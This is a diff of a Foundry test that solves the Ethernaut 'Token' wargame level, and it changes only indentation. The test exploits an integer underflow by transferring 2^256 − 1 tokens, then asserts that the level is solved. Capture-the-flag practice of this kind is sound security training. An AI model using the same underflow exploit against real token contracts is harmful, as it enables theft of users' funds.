@@ -8,17 +8,17 @@ import {Token} from "../src/levels/Token.sol";
 
 contract TokenTest is DSEthernautTest {
     function setUpLevel() public override {
-	TokenFactory factory = new TokenFactory();
-	ethernaut.registerLevel(factory);
-	levelAddress = ethernaut.createLevelInstance(factory);
+        TokenFactory factory = new TokenFactory();
+        ethernaut.registerLevel(factory);
+        levelAddress = ethernaut.createLevelInstance(factory);
     }
 
     function testSolveToken() public {
-	Token token = Token(payable(levelAddress));
-	vm.startPrank(address(this));
-	token.transfer(levelAddress, (2 ** 256) - 1);
-	vm.stopPrank();
-	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+        Token token = Token(payable(levelAddress));
+        vm.startPrank(address(this));
+        token.transfer(levelAddress, (2 ** 256) - 1);
+        vm.stopPrank();
+        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
     }
 
     receive() external payable {}
